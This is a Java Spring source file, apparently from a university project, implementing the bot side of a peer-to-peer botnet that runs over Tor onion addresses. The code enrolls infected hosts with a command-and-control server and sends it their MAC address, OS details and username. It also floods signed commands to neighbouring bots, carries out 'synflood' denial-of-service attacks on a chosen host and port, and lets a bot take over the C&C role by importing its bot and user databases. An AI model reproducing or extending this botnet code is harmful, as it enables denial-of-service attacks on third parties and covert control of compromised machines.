package cs.sii.bot.action;

import java.security.InvalidKeyException;
import java.security.PublicKey;
import java.security.SignatureException;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.Future;

import cs.sii.domain.OnionAddress;
import cs.sii.service.crypto.Auth;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.scheduling.annotation.Async;
import org.springframework.stereotype.Service;

import cs.sii.domain.Pairs;
import cs.sii.domain.SyncIpList;
import cs.sii.model.bot.Bot;
import cs.sii.model.role.Role;
import cs.sii.model.user.User;
import cs.sii.network.request.BotRequest;
import cs.sii.service.connection.NetworkService;
import cs.sii.service.graph.P2PMan;
import cs.sii.service.crypto.CryptoPKI;
import cs.sii.service.dao.BotServiceImpl;
import cs.sii.service.dao.RoleServiceImpl;
import cs.sii.service.dao.UserServiceImpl;

@Service
public class Behavior {

	@Autowired
	private NetworkService nServ;

	//@Autowired
	//private Config eng;

	@Autowired
	private BotRequest req;

	@Autowired
	private Auth auth;

	@Autowired
	private CryptoPKI pki;

	@Autowired
	private Malicious malS;

	@Autowired
	private BotServiceImpl bServ;

	@Autowired
	private RoleServiceImpl rServ;

	@Autowired
	private UserServiceImpl uServ;

	@Autowired
	private P2PMan pServ;

	// Il secondo valore è vuoto però ci serviva una lista sincata per non
	// implementarla di nuovo

	private SyncIpList<Integer, String> msgHashList = new SyncIpList<Integer, String>();

	/**
	 * just needed for initialize beans
	 * 
	 */
	public Behavior() {
	}

	/**
	 * 
	 */
	public void initializeBot() {
		System.out.println("INIZIALIZZAZIONE BOT MODE");
		if (challengeToCommandConquer()) {
			System.out.println("Bot Autenticazione riuscita");
		} else
			System.out.println("Bot Autenticazione fallita");

		String data = nServ.getIdHash();
		SyncIpList<OnionAddress, PublicKey> ips = nServ.getCommandConquerOnions();
		List<Pairs<String, String>> response = null;
		System.out.println("Richiedo vicini al C&C");
		response = req.askNeighbours(ips.get(0).getValue1().toString(), nServ.getMyOnion().getOnion(), data);
		List<Pairs<OnionAddress, PublicKey>> newNeighbours = new ArrayList<Pairs<OnionAddress, PublicKey>>();

		if (response != null) {
			response.forEach(ob -> System.out.println("Vicinato " + ob.getValue1().toString()));
		} else
			System.out.println("Risposta vicinato null");
		newNeighbours = nServ.tramsuteNeigha(response);
		if (newNeighbours != null) {
			newNeighbours.forEach(ob -> System.out.println("Vicinato convertito " + ob.getValue1().toString()));
		} else
			System.out.println("Risposta vicini senza elementi");
		nServ.getNeighbours().setAll(newNeighbours);

		SyncIpList<OnionAddress, PublicKey> buf = nServ.getNeighbours();
		buf.setAll(newNeighbours);
		nServ.setNeighbours(buf);
		System.out.println("Avviso i mie vicini di conoscerli");
		challengeToBot();
		System.out.println("INIZIALIZZAZIONE COMPLETATA, BOT READY");
	}

	/**
	 * challenges one of the CeC
	 * 
	 * @return true if the challenges goes well
	 */
	private boolean challengeToCommandConquer() {
		Boolean flag = true;
		while (flag) {
			System.out.println("Richiesta challenge a C&C " + nServ.getCommandConquerOnions().get(0).getValue1());
			//Primo valore è Long KEYNUMBER il secondo è Integer ITERATIONNUMBER
			Pairs<Long, Integer> challenge = req.getChallengeFromCeC(nServ.getIdHash(), nServ.getCommandConquerOnions().get(0).getValue1(),nServ.getMyOnion());
			if (challenge != null) {
				if (challenge.getValue2() != -1) {
					String key = auth.generateStringKey(challenge.getValue2());
					System.out.println("Sto calcolando Hmac");
					String hashMac = auth.generateHmac(challenge.getValue1(), auth.generateSecretKey(key));
					System.out.println("Hmac calcolato: "+hashMac);
					String response = req.getResponseFromCeC(nServ.getIdHash(), nServ.getMyOnion(), nServ.getMac(), nServ.getOs(), nServ.getVersionOS(), nServ.getArchOS(), nServ.getUsernameOS(), nServ.getCommandConquerOnions().get(0).getValue1(), hashMac, pki.getPubRSAKey(), nServ.isElegible());
					System.out.println("Risultato challenge con C&C: " + response);
					flag = false;
					return true;
				} else {
					System.out.println("Risultato challenge con C&C: " + true + " il C&C mi conosce ");
					return true;
				}
			}
		}
		return false;
	}

	// <HH> sono i separatori
	// IDMSG|COMANDO|SIGNATURE(IDMSG)

	// COMANDO
	// <CC> sono i separatori per i comandi

	/**
	 * @param rawData
	 */
	@Async
	public void floodAndExecute(String rawData, OnionAddress ip) {

		String msg = "";

		// decritta il msg
		System.out.println("Decripto richiesta di flood");
		msg = pki.getCrypto().decryptAES(rawData);
		if (msg == null)
			return;
		// Per comodità
		String[] msgs = msg.split("<HH>");
		if (msgs[1].startsWith("update")) {
			reloadDns();
			floodNeighoours(rawData, ip);
		} else {
			// hai gia ricevuto questo msg? bella domanda
			if (msgHashList.indexOfValue2(msgs[0]) < 0) {
				// System.out.println("idHashMessage " + msgs[0]);
				System.out.println("Nuovo comando da eseguire");
				// verifica la firma con chiave publica c&c
				try {
					// System.out.println("signature" + msgs[2]);
					// System.out.println(" pk " +
					// pki.demolishPuK(nServ.getCommandConquerOnions().getList().get(0).getValue2()));
				
					if (pki.validateSignedMessageRSA(msgs[0], msgs[2],	nServ.getCommandConquerOnions().get(0).getValue2())) {
						Pairs<Integer, String> data = new Pairs<>();
						data.setValue1(msgHashList.getSize() + 1);
						data.setValue2(msgs[0]);
						msgHashList.add(data);
						System.out.println("Signature OK");
						// se verificato inoltralo ai vicini
						System.out.println("Flood a vicini");
						floodNeighoours(rawData, ip);
						// inoltra all'interpretedei msg
						executeCommand(msgs[1]);

					} else {
						System.out.println("Signature Comando FALLITA1");
						nServ.firstConnectToMockServerDns();
						if (pki.validateSignedMessageRSA(msgs[0], msgs[2],	nServ.getCommandConquerOnions().get(0).getValue2())) {
							Pairs<Integer, String> data = new Pairs<>();
							data.setValue1(msgHashList.getSize() + 1);
							data.setValue2(msgs[0]);
							msgHashList.add(data);
							System.out.println("Signature OK");
							// se verificato inoltralo ai vicini
							System.out.println("Flood a vicini");
							floodNeighoours(rawData, ip);
							// inoltra all'interpretedei msg
							executeCommand(msgs[1]);

						} else {
							System.out.println("Signature Comando FALLITA2");
							nServ.firstConnectToMockServerDns();
							
						}
						
					}
				} catch (InvalidKeyException | SignatureException e) {
					System.out.println("Errore verifica Signature durante il flooding " + msgs[2]);
					e.printStackTrace();
				}
			} else {
				System.out.println("Comando gia eseguito");
			}
		}
	}

	@Async
	private void floodNeighoours(String msg, OnionAddress ip) {
		SyncIpList<OnionAddress, PublicKey> listNeighbourst = nServ.getNeighbours();
		for (int i = 0; i < listNeighbourst.getSize(); i++) {
			Pairs<OnionAddress, PublicKey> p = listNeighbourst.get(i);

			if (!ip.getOnion().equals(p.getValue1().getOnion())) {
				req.sendFloodToOtherBot(p.getValue1(), msg);
				System.out.println("flood vicino " + p.getValue1().getOnion());
			}
		}
	}

	@Async
	private void executeCommand(String msg) {
		System.out.println("Eseguendo comando " + msg);
		if (msg.startsWith("newking")) {
				if (nServ.getCounterCeCMemory() == 1) {
					clearCecDatabase();
					nServ.setCounterCeCMemory(-1);
				}
				updateCecInfo(msg);
		}
		if (msg.startsWith("synflood")) {
			// scompongo messaggio al fine di riempire i campi, codifica
			// particolare <SA>
			// TODO da fare
			String[] msgs = msg.split("<TT>");
			OnionAddress ipDest = new OnionAddress(msgs[1].toString());
			Integer portDest = Integer.parseInt(msgs[2].toString());
			Integer time = Integer.parseInt(msgs[3].toString());

			if (nServ.getIdUser().equals(msgs[4].toString())) {
				System.out.println("Appartengo a utente " + nServ.getIdUser());
				System.out.println("IpDest di attacco " + ipDest);
				System.out.println("PortDest di attacco " + portDest);
				System.out.println("Time di attacco " + time);
				malS.synFlood(ipDest.toString(), portDest, time);
			} else
				System.out.println("Non eseguo il comando, non sono di proprieta dell'utente");
		}
		if (msg.startsWith("setbot")) {
			String[] msgs = msg.split("<BU>");
			String idBot = msgs[1].toString();
			String idUser = msgs[2].toString();
			if (nServ.getIdHash().equals(idBot))
				nServ.setIdUser(idUser);
		}
		if (msg.startsWith("delbot")) {
			String[] msgs = msg.split("<BU>");
			String idUser = msgs[1].toString();
			if (nServ.getIdUser().equals(idUser))
				nServ.setIdUser("");
		}

		System.out.println("COMANDO ESEGUTO");
	}

	public void reloadDns() {
		System.out.println("Aggiorno il CeC tramite una richiesta al DNS");
		Boolean result=nServ.firstConnectToMockServerDns();
		System.out.println("Risultato aggiornamento dal DNS "+result);
	}

	public void updateCecInfo(String msg) {
		String[] msgs = msg.split("<CC>");
		nServ.getCommandConquerOnions().remove(0);
		Pairs<OnionAddress, PublicKey> pairs = new Pairs<OnionAddress, PublicKey>(new OnionAddress(msgs[1]), pki.rebuildPuK(msgs[2]));
		nServ.getCommandConquerOnions().add(pairs);
		System.out.println("C&C AGGIORNATO");

	}

	public BotRequest getRequest() {
		return req;
	}

	public void setRequest(BotRequest request) {
		this.req = request;
	}

	public Pairs<Long, Integer> authReqBot(String idBot) {
		System.out.println("Inizio fase di autenticazione BotToBot");
		if (auth.getNeighSeed().indexOfValue1(idBot) >= 0)
			return auth.getNeighSeed().getByValue1(idBot).getValue2();
		Long keyNumber = new Long(auth.generateNumberText());
		Integer iterationNumber = new Integer(auth.generateIterationNumber());
		System.out.println("KeyNumber: " + keyNumber);
		System.out.println("IterationNumber: " + iterationNumber);
		System.out.println("Idbot: " + idBot);
		Pairs<Long, Integer> challenge = new Pairs<Long, Integer>(keyNumber, iterationNumber);
		Pairs<String, Pairs<Long, Integer>> map = new Pairs<String, Pairs<Long, Integer>>(idBot, challenge);
		boolean x = auth.getNeighSeed().add(map);
		System.out.println("Fine generazione chiavi di autenticazione BotToBot");
		return challenge;
	}

	public Boolean checkHmacBot(ArrayList<Object> objects) {
		System.out.println("Inizio fase di verifica Hmac BotToBot");
		Boolean response = false;
//		System.out.println(" inizio check");
		SyncIpList<String, Pairs<Long, Integer>> lista = auth.getNeighSeed();
//		System.out.println("size lista hmac vicini " + lista.getSize());
		String idBot = objects.get(0).toString();
		String hashMac = objects.get(1).toString();
		if (lista != null && lista.getSize() > 0) {
			Pairs<String, Pairs<Long, Integer>> buff = lista.removeByValue1(idBot);
			if (buff != null) {
				Pairs<Long, Integer> coppia = buff.getValue2();
				Long keyNumber = coppia.getValue1();
				Integer iterationNumber = coppia.getValue2();
				if (coppia != null) {
					if (auth.validateHmac(keyNumber, iterationNumber, hashMac)) {
						response = true;
						// aggiungere a vicini
					}
				}
			} else
				System.out.println("Hmac del bot non trovata " + idBot);
		}
		System.out.println("Fine verifica Hmac BotToBot");
		return response;
	}

	/**
	 * challenges one of the CeC
	 * 
	 * @return true if the challenges goes well
	 * @throws ExecutionException
	 * @throws InterruptedException
	 */

	private void challengeToBot() {
		System.out.println("Invio challenge ai miei vicini ");

		SyncIpList<OnionAddress, PublicKey> listNegh = nServ.getNeighbours();

		SyncIpList<Future<Pairs<Long, Integer>>, OnionAddress> botResp = new SyncIpList<Future<Pairs<Long, Integer>>, OnionAddress>();

		for (int i = 0; i < listNegh.getSize(); i++) {
			Pairs<OnionAddress, PublicKey> pairs = listNegh.get(i);
			Future<Pairs<Long, Integer>> result = req.getChallengeFromBot(nServ.getIdHash(), pairs.getValue1());
			Pairs<Future<Pairs<Long, Integer>>, OnionAddress> element = new Pairs<Future<Pairs<Long, Integer>>, OnionAddress>(result, pairs.getValue1());
			botResp.add(element);
		}
		System.out.println("Richieste inviate attendo le risposte");
		while (botResp.getSize() != 0) {
			for (int i = 0; i < botResp.getSize(); i++) {
				Pairs<Future<Pairs<Long, Integer>>, OnionAddress> coppia = botResp.get(i);
				if (coppia.getValue1().isDone()) {
					botResp.remove(coppia);
					if (coppia.getValue1() != null) {
						Pairs<Long, Integer> resp;
						try {
							resp = coppia.getValue1().get();
							OnionAddress dest = coppia.getValue2();
							if (resp != null) {
								String key = auth.generateStringKey(resp.getValue2());
								String hashMac = auth.generateHmac(resp.getValue1(), auth.generateSecretKey(key));
								Boolean b = false;
								b = req.getResponseFromBot(nServ.getIdHash(), dest, hashMac, pki.getPubRSAKey());
								if (b != null && b) {
//									System.out.println("botSize " + botResp.getSize());
								} else {
									System.out.println("Challenge vicini hmac null o false" + b);
								}
							} else {
								System.out.println("Il vicino ha risposto  null, nessun valore challenge");
							}

						} catch (InterruptedException | ExecutionException e) {
							System.out.println("Errore connessione da ip " + coppia.getValue2().toString());
							e.printStackTrace();
						}
					} else {
						System.out.println("Rimosso hmac in attesa vicinato " + coppia.getValue2());

					}
				}
			}
		}

	}


	/**
	 * Acquisisco il database da i precedenti o altri C&C
	 * @param ip
	 */
	@Async
	public void getPower(String ip) {
		pServ.setNewKing(nServ.getIdHash());
		System.out.println("Creo grafo rete P2P");
		pServ.createNetworkP2P();
		String myId = pki.getCrypto().encryptAES(nServ.getIdHash());
		System.out.println("Importo Database dal C&C");
		// richiesta ruoli
		List<Role> roles = req.getRoles(ip, myId);
		if (roles != null) {
			Collections.sort(roles, (a, b) -> a.getId() < b.getId() ? -1 : a.getId() == b.getId() ? 0 : 1);
			roles.forEach(role -> System.out.println("Ruolo: " + role));
			rServ.saveAll(roles);
		}
		// richiesta bots
		List<Bot> bots = req.getBots(ip, myId);
		if (bots != null) {
			Collections.sort(bots, (a, b) -> a.getId() < b.getId() ? -1 : a.getId() == b.getId() ? 0 : 1);
			bots.forEach(bot -> System.out.println("Bot: " + bot));
			bServ.saveAll(bots);
		}

		// richiesta users
		List<User> users = req.getUser(ip, myId);
		if (users != null) {
			Collections.sort(users, (a, b) -> a.getId() < b.getId() ? -1 : a.getId() == b.getId() ? 0 : 1);
			users.forEach(user -> System.out.println("Utenti: " + user));
			uServ.saveAll(users);
		}
		// prendo grafo
		List<String> graph = req.getPeers(ip, myId);

		graph.forEach(e -> System.out.println("Archi: " + e));
		// informo cc vecchio che spnp ready

		List<OnionAddress> vertex = new ArrayList<OnionAddress>();
		List<Pairs<OnionAddress, OnionAddress>> edge = new ArrayList<Pairs<OnionAddress, OnionAddress>>();
		List<String[]> strs = new ArrayList<String[]>();
		for (String str : graph) {
			String[] sts = str.split("<HH>");
			for (int i = 0; i < sts.length; i++) {
				System.out.println("parse edge " + i + " " + sts[i]);
			}
			edge.add(new Pairs<OnionAddress, OnionAddress>(new OnionAddress(sts[0]), new OnionAddress(sts[1])));
			if (!vertex.contains(new OnionAddress(sts[0])))
				vertex.add(new OnionAddress(sts[0]));
			if (!vertex.contains(new OnionAddress(sts[1])))
				vertex.add(new OnionAddress(sts[1]));
		}
		edge.forEach(e -> System.out.println("edge " + e.getValue1() + " to " + e.getValue2()));
		vertex.forEach(v -> System.out.println("vertex " + v.getOnion()));
		System.out.println("Aggiorno grafo rete P2P con quello del C&C");
		pServ.updateNetworkP2P(edge, vertex);

		SyncIpList<OnionAddress, String> gg = nServ.getAliveBot();

		for (Bot bot : bots) {
			if (vertex.indexOf(new OnionAddress(bot.getOnionAddress())) >= 0)
				gg.add(new Pairs<OnionAddress, String>(new OnionAddress(bot.getOnionAddress()), bot.getIdBot()));
		}

		// avvisa cec che se ready
		Boolean b = req.ready(ip, myId);
		if ((b != null) && (b)) {
			System.out.println("SONO IL NUOVO C&C");
			//TODO eng.setCommandandconquerStatus(true); replace con sotto
			nServ.setCommandConquerStatus(true);
			nServ.setCounterCeCMemory(0);
			pServ.setNewKing("");
		}
		// controllare risposta da cec che ha avvisato dns
	}

	public void pingToNeighbours() {
		System.out.println("PING a vicini e vedo se sono vivi");
		SyncIpList<OnionAddress, PublicKey> listNegh = nServ.getNeighbours();
		SyncIpList<Future<Boolean>, OnionAddress> botResp = new SyncIpList<Future<Boolean>, OnionAddress>();
		List<OnionAddress> listDeadNegh = new ArrayList<OnionAddress>();

		for (int i = 0; i < listNegh.getSize(); i++) {
			Pairs<OnionAddress, PublicKey> pairs = listNegh.get(i);
			Future<Boolean> result = req.pingToBot(pairs.getValue1().toString());
			Pairs<Future<Boolean>, OnionAddress> element = new Pairs<Future<Boolean>, OnionAddress>(result, pairs.getValue1());
			botResp.add(element);
		}

		while (botResp.getSize() != 0) {
			for (int i = 0; i < botResp.getSize(); i++) {
				Pairs<Future<Boolean>, OnionAddress> coppia = botResp.get(i);
				if (coppia.getValue1().isDone()) {
					botResp.remove(coppia);
					if (coppia.getValue1() != null) {
						Boolean response;
						try {
							response = coppia.getValue1().get();
							OnionAddress dest = coppia.getValue2();
							if (response) {
								System.out.println("Il vicino " + dest + " è vivo");
							} else {
								listDeadNegh.add(coppia.getValue2());
								System.out.println("Il vicino " + dest + " è morto");
							}

						} catch (InterruptedException | ExecutionException e) {
							System.out.println("Errore connessione da ip " + coppia.getValue2().toString());
							e.printStackTrace();
						}
					} else {
						listDeadNegh.add(coppia.getValue2());
					}
				}
			}
		}
		if (!listDeadNegh.isEmpty())
			syncNeightoCec(listDeadNegh);
		System.out.println("Fase di PING conclusa");
	}

	private void syncNeightoCec(List<OnionAddress> listDeadNegh) {
		// invio a cec la mia nuova lista vicini ovvero di chi mi ha risposto
		List<Pairs<OnionAddress, PublicKey>> newNeighbours = new ArrayList<Pairs<OnionAddress, PublicKey>>();
		List<Pairs<String, String>> response = null;
		if (!nServ.isCommandandconquerStatus()) {
			response = req.sendDeadNeighToCeC(nServ.getCommandConquerOnions().get(0).getValue1().toString(), nServ.getIdHash(), listDeadNegh);
			if (response != null) {
				newNeighbours = nServ.tramsuteNeigha(response);
				if (newNeighbours != null) {
					newNeighbours.forEach(ob -> System.out.println("Vicinato convertito " + ob.getValue1().toString()));
				} else
					System.out.println("Risposta vicini senza elementi");

				SyncIpList<OnionAddress, PublicKey> buf = nServ.getNeighbours();
				buf.setAll(newNeighbours);
				nServ.setNeighbours(buf);
				System.out.println("Avviso i mie vicini di conoscerli");
				challengeToBot();
			} else {
				System.out.println("Errore invio morti al CeC");
			}
		} else {
			System.out.println("Sono CeC e mi auto sincronizzo");
			for (OnionAddress botDead : listDeadNegh) {
				nServ.getAliveBot().removeByValue1(botDead);
				nServ.getNeighbours().removeByValue1(botDead);
				pServ.updateNetworkP2P();
			}

		}
	}

	public void clearCecDatabase() {
		uServ.deleteAll();
		bServ.deleteAll();
		rServ.deleteAll();

	}

	public P2PMan getpServ() {
		return pServ;
	}

	public void setpServ(P2PMan pServ) {
		this.pServ = pServ;
	}
}